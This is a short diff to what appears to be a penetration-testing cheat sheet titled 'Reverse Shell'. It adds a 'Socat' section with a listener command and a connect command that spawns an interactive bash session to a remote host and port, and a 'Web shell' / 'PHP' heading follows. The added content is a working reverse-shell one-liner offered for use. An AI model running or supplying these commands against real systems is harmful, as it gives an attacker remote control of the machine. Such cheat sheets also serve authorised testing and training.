@@ -1,5 +1,19 @@
 # Reverse Shell
 
+## Socat
+
+### Listener
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
+```
+
+### Connect
+
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<RHOST>:<RPORT>
+```
+
 ## Web shell
 
 ### PHP
